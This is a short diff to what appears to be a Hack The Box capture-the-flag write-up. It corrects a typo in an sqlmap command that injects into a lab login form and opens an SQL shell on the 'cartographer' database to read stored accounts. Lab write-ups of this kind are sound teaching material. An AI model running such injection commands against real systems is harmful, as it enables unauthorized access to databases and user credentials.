@@ -32,7 +32,7 @@ sqlmap -u http://docker.hackthebox.eu:31837/ --data="username=asd&password=asd" 
 
 It has all the info. So I want to use a sql query to consume it. SQLMap can give me access to a SQL console using this command
 ```bash
-sqlmap -u http://docker.hackthebox.eu:31837/ --data="username=asd&password=asd" ---D cartographer --sql-shell
+sqlmap -u http://docker.hackthebox.eu:31837/ --data="username=asd&password=asd" -D cartographer --sql-shell
 ```
 
 Send a query to get the accounts.
